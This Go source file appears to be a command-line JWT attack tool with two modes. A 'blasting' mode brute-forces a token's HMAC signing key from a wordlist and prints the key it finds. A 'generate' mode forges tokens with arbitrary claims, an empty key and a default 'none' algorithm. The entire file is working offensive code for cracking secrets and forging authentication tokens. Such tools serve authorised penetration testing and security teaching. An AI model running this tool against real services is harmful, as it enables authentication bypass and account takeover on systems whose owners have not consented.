package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"strings"

	"github.com/golang-jwt/jwt/v4"
)

func runBlasting(path, jwtStr, alg string) {
	if alg == "none" {
		alg = "HS256"
	}
	data, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		key := strings.TrimSpace(line)
		token, err := jwt.Parse(jwtStr, func(token *jwt.Token) (interface{}, error) {
			return []byte(key), nil
		})
		if err == nil && token.Valid {
			fmt.Println("found key! -->", key)
			return
		} else {
			if ve, ok := err.(*jwt.ValidationError); ok {
				if ve.Errors&jwt.ValidationErrorSignatureInvalid == 0 {
					fmt.Println("found key! -->", key)
					return
				}
			}
		}
	}
	fmt.Println("key not found!")
}

func generateJWT(dictString, key, alg string) string {
	var claims map[string]interface{}
	json.Unmarshal([]byte(dictString), &claims)
	token := jwt.NewWithClaims(jwt.GetSigningMethod(alg), jwt.MapClaims(claims))
	tokenString, err := token.SignedString([]byte(key))
	if err != nil {
		fmt.Println("Error generating token:", err)
		return ""
	}
	return tokenString
}

func main() {
	mode := flag.String("mode", "", "Mode has generate disable encryption and blasting encryption key [generate/blasting]")
	jwtString := flag.String("string", "", "Input your JWT string")
	algorithm := flag.String("algorithm", "none", "Input JWT algorithm default:NONE")
	keyFile := flag.String("kf", "", "Input your Verify Key File")
	flag.Parse()

	if *mode == "generate" {
		fmt.Println(generateJWT(*jwtString, "", *algorithm))
	} else if *mode == "blasting" {
		runBlasting(*keyFile, *jwtString, *algorithm)
	} else {
		flag.PrintDefaults()
	}
}
